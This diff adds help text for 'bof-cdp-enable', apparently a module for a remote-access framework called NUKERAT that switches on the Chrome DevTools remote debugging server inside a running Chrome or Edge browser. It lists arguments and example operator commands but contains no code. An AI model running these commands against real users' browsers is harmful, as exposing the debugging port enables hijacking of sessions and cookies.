@@ -1,0 +1,21 @@
+ABOUT
+    Enables the Chrome DevTools Protocol in a running x64 Chrome or Edge
+    browser. Resolves internal browser symbols at runtime and starts the
+    remote debugging server on the browser UI thread. x64 only.
+USAGE:
+    bof-cdp-enable --- <edge|chrome> [port]
+
+ARGUMENTS:
+    edge|chrome         Browser target (ordinary Chrome or Edge process)
+    port                Optional. TCP port for CDP (9000 to 65535)
+
+EXAMPLES:
+    bof-cdp-enable --- chrome
+    bof-cdp-enable --- edge 9301
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-cdp-enable -w 60 --- chrome
